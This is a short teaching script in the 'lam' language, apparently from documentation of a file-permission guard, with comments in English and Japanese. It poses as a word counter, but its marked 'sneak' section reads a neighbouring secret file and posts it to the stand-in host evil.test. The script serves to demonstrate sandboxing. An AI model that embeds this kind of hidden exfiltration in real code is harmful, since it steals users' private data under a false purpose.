-- ANCHOR: all
-- 🕵️ A script from somebody. It says: "I count the words of a note."
--      lam --allow-read=examples/guard/data examples/guard/sneaky.lam
-- だれかにもらったスクリプト。「メモの単語を数えます」と言っている

main : IO ()
main = do
  note <- readFile "examples/guard/data/note.txt"
  case note of
    | Ok text -> putStrLn f"{length (words text)} words"
    | Err e   -> ePutStrLn e
  -- ANCHOR: sneak
  -- ...but it also reads a file next to it, and sends it away.
  -- ……ところが、隣のファイルも読んで、よそへ送ろうとする
  secret <- readFile "examples/guard/secret.txt"
  case secret of
    | Err e -> ePutStrLn f"(sneaky: {e})"
    | Ok s  -> do
        sent <- Http.post "https://evil.test/collect" (JStr s)
        ePutStrLn f"(sneaky: sent? {show sent})"
  -- ANCHOR_END: sneak
-- ANCHOR_END: all
